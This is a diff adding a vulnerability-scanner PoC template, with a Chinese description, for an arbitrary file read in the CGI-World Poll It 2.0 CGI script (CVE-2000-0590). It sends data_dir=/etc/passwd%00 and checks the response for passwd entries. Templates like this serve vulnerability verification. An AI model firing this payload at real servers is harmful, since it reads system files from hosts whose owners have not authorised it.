@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "CGI-World Poll It 2.0 投票系统 CGI 脚本存在内部变量覆盖漏洞，通过向 data_dir 参数传入特制文件路径（如 /etc/passwd%00）可读取服务器任意文件，验证方式为请求后匹配响应中包含的文件内容特征"
+id = "POC-AVE-2000-0469"
+name = "CGI-World Poll It 2.0 任意文件读取漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0469"]
+vuln_id = [
+    "CVE-2000-0590",
+    "AVE-2000-0469",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "nobody:",
+    "daemon:",
+]
+
+[poc.requests.params]
+data_dir = "/etc/passwd%00"
